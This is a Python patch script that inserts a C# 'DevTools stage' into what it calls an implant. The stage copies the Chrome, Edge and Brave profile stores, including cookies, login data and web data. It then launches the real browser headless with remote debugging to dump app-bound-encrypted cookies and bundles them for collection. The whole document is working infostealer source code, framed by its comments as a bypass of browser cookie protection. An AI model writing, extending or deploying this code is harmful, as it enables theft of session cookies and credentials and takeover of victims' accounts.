# one-shot: add DevTools remote-debugging cookie dump to implant/Stages.cs
import io

ADD = io.StringIO()
ADD.write('''
        // ------------------------------------------------------------ devtools
        // ABE bypass via the browser itself (T1555.003 / T1539): spawn the
        // genuine signed chrome.exe headless against a shadow copy of the
        // profile; Chrome decrypts v20 app-bound cookies through its own
        // elevation service, and we dump them via the DevTools protocol.
        public static string DevToolsStage(List<Part> parts)
        {
            string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string[][] cands = new string[][]
            {
                new string[] { "chrome", FindBrowserExe("chrome.exe",
                    @"Google\\Chrome\\Application\\chrome.exe"),
                    Path.Combine(lad, @"Google\\Chrome\\User Data") },
                new string[] { "edge", FindBrowserExe("msedge.exe",
                    @"Microsoft\\Edge\\Application\\msedge.exe"),
                    Path.Combine(lad, @"Microsoft\\Edge\\User Data") },
                new string[] { "brave", FindBrowserExe("brave.exe",
                    @"BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                    Path.Combine(lad, @"BraveSoftware\\Brave-Browser\\User Data") },
            };
            int done = 0;
            foreach (string[] c in cands)
            {
                if (c[1] == null || !File.Exists(c[1]) || !Directory.Exists(c[2])) continue;
                try
                {
                    byte[] cookies = DevToolsDumpCookies(c[1], c[2]);
                    if (cookies != null && cookies.Length > 40)
                    {
                        parts.Add(new Part("b:" + c[0] + "/devtools_cookies.json", cookies,
                            new Util.JsonObj().Add("method", "cdp Network.getAllCookies").ToString()));
                        done++;
                        Util.Log("{0}: devtools dump {1} bytes", c[0], cookies.Length);
                    }
                }
                catch (Exception e) { Util.Log("{0}: devtools failed: {1}", c[0], e.Message); }
            }
            return "devtools=" + done;
        }

        private static string FindBrowserExe(string exe, string relPath)
        {
            string[] roots = new string[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            };
            foreach (string r in roots)
            {
                if (string.IsNullOrEmpty(r)) continue;
                string p = Path.Combine(Path.Combine(r, relPath.Split('\\\\')[0]),
                                        string.Join("\\\\", relPath.Split('\\\\'), 1, relPath.Split('\\\\').Length - 1));
                if (File.Exists(p)) return p;
            }
            // App Paths registry fallback
            try
            {
                object v = Microsoft.Win32.Registry.LocalMachine
                    .OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + exe)
                    .GetValue("");
                if (v != null && File.Exists(v.ToString())) return v.ToString();
            }
            catch { }
            return null;
        }

        private static byte[] DevToolsDumpCookies(string exe, string userData)
        {
            string tempRoot = Path.Combine(Path.GetTempPath(),
                "sh_dt_" + Guid.NewGuid().ToString("N").Substring(0, 10));
            string ud = Path.Combine(tempRoot, "ud");
            Process proc = null;
            try
            {
                // shadow profile: the files Chrome needs to decrypt the store
                Directory.CreateDirectory(Path.Combine(ud, "Default", "Network"));
                byte[] ls = Util.ReadFileLoose(Path.Combine(userData, "Local State"));
                if (ls == null) return null;
                File.WriteAllBytes(Path.Combine(ud, "Local State"), ls);
                string[][] copies = new string[][]
                {
                    new string[] { Path.Combine(userData, "Default", "Network", "Cookies"),
                                   Path.Combine(ud, "Default", "Network", "Cookies") },
                    new string[] { Path.Combine(userData, "Default", "Network", "Login Data"),
                                   Path.Combine(ud, "Default", "Network", "Login Data") },
                    new string[] { Path.Combine(userData, "Default", "Login Data"),
                                   Path.Combine(ud, "Default", "Login Data") },
                    new string[] { Path.Combine(userData, "Default", "Web Data"),
                                   Path.Combine(ud, "Default", "Web Data") },
                };
                foreach (string[] cp in copies)
                {
                    if (!File.Exists(cp[0])) continue;
                    byte[] d = Util.ReadFileLoose(cp[0]);
                    if (d == null)
                        d = Util.ReadFileViaHandleDup(FileSuffixFromUserData(userData, cp[0]));
                    if (d != null) File.WriteAllBytes(cp[1], d);
                }

                ProcessStartInfo psi = new ProcessStartInfo(exe,
                    "--headless=new --remote-debugging-port=0 --user-data-dir=\\"" + ud + "\\" " +
                    "--no-first-run --no-default-browser-check --disable-gpu " +
                    "--disable-extensions --remote-allow-origins=* about:blank");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardError = true;
                proc = Process.Start(psi);

                string wsUrl = null;
                System.Threading.Thread worker = null;
                string allErr = "";
                // stderr arrives on a reader thread; poll a shared string
                object box = new object();
                worker = new System.Threading.Thread(delegate()
                {
                    try { allErr = proc.StandardError.ReadToEnd(); } catch { }
                });
                worker.IsBackground = true;
                worker.Start();
                for (int i = 0; i < 150; i++)   // up to 15s
                {
                    System.Threading.Thread.Sleep(100);
                    lock (box)
                    {
                        int j = allErr.IndexOf("DevTools listening on ", StringComparison.Ordinal);
                        if (j >= 0)
                        {
                            int k = allErr.IndexOf(' ', j + 22);
                            wsUrl = allErr.Substring(j + 22, (k < 0 ? allErr.Length : k) - (j + 22)).Trim();
                            break;
                        }
                    }
                }
                if (wsUrl == null) return null;
                Util.Log("  devtools endpoint: {0}", wsUrl);

                // one-shot CDP call over the browser websocket
                return CdpCall(wsUrl, "{\\"id\\":1,\\"method\\":\\"Network.getAllCookies\\"}");
            }
            finally
            {
                try { if (proc != null && !proc.HasExited) proc.Kill(); } catch { }
                try { Directory.Delete(tempRoot, true); } catch { }
            }
        }

        private static string FileSuffixFromUserData(string userData, string fullPath)
        {
            // e.g. Google\\Chrome\\User Data\\Default\\Network\\Cookies
            int i = fullPath.IndexOf(userData, StringComparison.OrdinalIgnoreCase);
            string rel = i >= 0 ? fullPath.Substring(userData.Length).TrimStart('\\\\') : Path.GetFileName(fullPath);
            string browser = userData.ToLowerInvariant().Contains("brave")
                ? @"BraveSoftware\\Brave-Browser\\User Data"
                : userData.ToLowerInvariant().Contains("edge")
                    ? @"Microsoft\\Edge\\User Data"
                    : @"Google\\Chrome\\User Data";
            return browser + "\\\\" + rel;
        }

        private static byte[] CdpCall(string wsUrl, string message)
        {
            System.Net.WebSockets.ClientWebSocket ws =
                new System.Net.WebSockets.ClientWebSocket();
            ws.ConnectAsync(new Uri(wsUrl), System.Threading.CancellationToken.None)
              .Wait(8000);
            if (ws.State != System.Net.WebSockets.WebSocketState.Open) return null;
            byte[] send = System.Text.Encoding.UTF8.GetBytes(message);
            ws.SendAsync(new ArraySegment<byte>(send),
                System.Net.WebSockets.WebSocketMessageType.Text, true,
                System.Threading.CancellationToken.None).Wait(8000);

            using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
            {
                byte[] buf = new byte[256 * 1024];
                System.Threading.CancellationToken ct = System.Threading.CancellationToken.None;
                while (true)
                {
                    System.Threading.Tasks.Task<System.Net.WebSockets.WebSocketReceiveResult> t =
                        ws.ReceiveAsync(new ArraySegment<byte>(buf), ct);
                    if (!t.Wait(30000)) break;
                    var r = t.Result;
                    if (r.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;
                    ms.Write(buf, 0, r.Count);
                    if (r.EndOfMessage) break;
                    if (ms.Length > 64 * 1024 * 1024) break;
                }
                try { ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure,
                     "done", ct).Wait(2000); } catch { }
                return ms.ToArray();
            }
        }

''')

src = open("implant/Stages.cs", encoding="utf-8").read()
anchor = "        // ------------------------------------------------------------ sysinfo"
assert anchor in src, "anchor missing"
src = src.replace(anchor, ADD.getvalue() + anchor, 1)
open("implant/Stages.cs", "w", encoding="utf-8").write(src)
print("DevTools stage added")
